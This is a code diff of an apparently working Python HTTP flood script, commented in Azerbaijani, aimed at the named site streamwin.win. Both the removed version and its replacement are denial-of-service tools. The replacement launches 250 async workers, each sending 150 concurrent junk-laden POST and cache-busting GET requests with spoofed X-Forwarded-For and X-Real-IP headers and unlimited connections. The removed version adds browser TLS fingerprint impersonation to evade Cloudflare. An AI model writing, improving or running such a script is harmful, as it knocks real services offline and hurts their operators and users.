@@ -1,55 +1,78 @@
 import asyncio
-from curl_cffi.requests import AsyncSession
+import httpx
 import random
 import string
-import time
+import os
 
+# --- ATOM BOMBASI KONFİQURASİYASI ---
 TARGET_URL = "https://streamwin.win"
-WORKERS = 60 # curl_cffi daha ağırdır, 60 worker kifayət edir
-BATCH = 30   # Hər worker eyni anda 30 sürətli və gizli stream açır
+WORKERS = 250        # Maksimum paralel hücumçu
+BATCH_SIZE = 150     # Hər hücumçunun eyni anda açdığı "öldürücü" stream sayı
+DATA_STRIKE = 4096   # Hər POST-da göndərilən ağır yük (CPU-nu dondurmaq üçün)
 
-def r_str(n):
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
+def generate_junk(size):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
 
-async def terminator_strike(worker_id):
-    # curl_cffi brauzeri TLS səviyyəsində təqlid edir (JA3 Bypass)
-    async with AsyncSession(impersonate="chrome124", http2=True, verify=False) as s:
-        print(f"💀 TERMINATOR Worker {worker_id} - CLOUDFLARE BYPASSED!")
-        
-        while True:
-            try:
-                # Ağır URL-lər (Axtarış bölmələri, API-lər)
-                url = f"{TARGET_URL}/?s={r_str(30)}&v={time.time()}&id={random.getrandbits(32)}"
-                
-                headers = {
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-                    "Accept-Encoding": "gzip, deflate, br, zstd",
-                    "Accept-Language": "en-US,en;q=0.9",
-                    "Cache-Control": "no-cache",
-                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}",
-                    "X-Requested-With": "XMLHttpRequest"
-                }
+async def tsar_strike(worker_id, client):
+    print(f"☢️  TSAR WARHEAD {worker_id} - TARGETING ORIGIN SERVER...")
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "X-Requested-With": "XMLHttpRequest",
+        "Cache-Control": "no-store, no-cache, must-revalidate",
+        "Connection": "keep-alive"
+    }
 
-                tasks = []
-                for _ in range(BATCH):
-                    # Saytın daxili elementlərini hədəf alan POST və GET qarışığı
-                    if _ % 3 == 0:
-                        tasks.append(s.post(url, headers=headers, json={"search": r_str(500), "filter": "all"}))
-                    else:
-                        tasks.append(s.get(url, headers=headers))
+    while True:
+        try:
+            # Serverin daxili loglarını və RAM-ını kilitləyəcək dinamik URL
+            url = f"{TARGET_URL}/?{generate_junk(10)}={generate_junk(50)}&db_attack={random.getrandbits(64)}"
+            
+            tasks = []
+            for _ in range(BATCH_SIZE):
+                h = headers.copy()
+                fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+                h["X-Forwarded-For"] = fake_ip
+                h["X-Real-IP"] = fake_ip
                 
-                # Sorğuları paralel olaraq serverə çırpırıq
-                await asyncio.gather(*tasks, return_exceptions=True)
+                # VECTOR A: MASSIVE JSON POST (Server RAM/CPU Kilitləmə)
+                if _ % 2 == 0:
+                    heavy_payload = {generate_junk(10): generate_junk(DATA_STRIKE) for _ in range(5)}
+                    tasks.append(client.post(url, headers=h, json=heavy_payload))
                 
-            except Exception:
-                await asyncio.sleep(0.01)
+                # VECTOR B: HTTP/2 FRAME FLOODING (Bağlantı Kanallarını Bağlama)
+                else:
+                    tasks.append(client.get(url, headers=h))
+
+            # Bütün asinxron sorğuları eyni anda serverin prosessoruna çırp!
+            # return_exceptions=True sayəsində xətalar olsa da dayanmayacaq
+            await asyncio.gather(*tasks, return_exceptions=True)
+            
+            # Gözləmə müddətini sıfıra endiririk (Maksimum zərbə sürəti)
+            await asyncio.sleep(0.0001)
+
+        except Exception:
+            await asyncio.sleep(0.1)
 
 async def main():
-    print(f"💀 TERMINATOR MODE ACTIVE: {TARGET_URL}")
-    print("[!] Mimicking Chrome 124 TLS Fingerprint...")
+    print(f"💀 GLOBAL TSAR BOMBA ACTIVATED: {TARGET_URL}")
+    print("[!] Resource Exhaustion: Targeting Origin CPU and Memory...")
     
-    workers = [terminator_strike(i) for i in range(WORKERS)]
-    await asyncio.gather(*workers)
+    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
+    
+    # TCP hüdudlarını və bağlantı limitlərini tamamilə ləğv daxili client
+    async with httpx.AsyncClient(
+        http2=True,          # Cloudflare Bypass üçün HTTP/2 mütləqdir
+        verify=False, 
+        limits=limits, 
+        timeout=10.0,        # Server donanda bağlantını buraxma (Slowloris effekti)
+        follow_redirects=True
+    ) as client:
+        
+        workers = [tsar_strike(i, client) for i in range(WORKERS)]
+        await asyncio.gather(*workers)
 
 if __name__ == "__main__":
     asyncio.run(main())
